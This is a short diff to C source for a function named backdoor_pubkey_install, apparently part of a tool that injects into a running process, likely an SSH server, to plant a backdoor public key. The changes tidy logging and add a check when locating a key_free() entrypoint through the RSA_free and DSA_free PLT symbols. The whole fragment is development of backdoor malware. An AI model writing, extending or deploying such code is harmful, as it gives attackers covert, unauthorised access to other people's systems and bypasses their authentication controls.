@@ -82,8 +82,8 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 						ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, (char*)ctx->dynstr, "DSA_free"
 					));
 
-					info("RSA_free@plt = 0x%lx\n", p_rsa_free);
-					info("DSA_free@plt = 0x%lx\n", p_dsa_free);
+					info("RSA_free@plt = 0x%lx", p_rsa_free);
+					info("DSA_free@plt = 0x%lx", p_dsa_free);
 
 					callpair_b = find_callpair(p_rsa_free, p_dsa_free);
 
@@ -91,7 +91,13 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 						callpair_b = find_callpair(p_dsa_free, p_rsa_free);
 					}
 
-					signatures[i].addr = find_entrypoint_inner(callpair_b, 3);
+					if(callpair_b != 0) {
+						info("found callpair @ 0x%lx .. finding entrypoint..", callpair_b);
+
+						signatures[i].addr = find_entrypoint_inner(callpair_b, 3);
+					} else {
+						error("could not find valid callpair to derive key_free()");
+					}
 				break;
 
 				default:
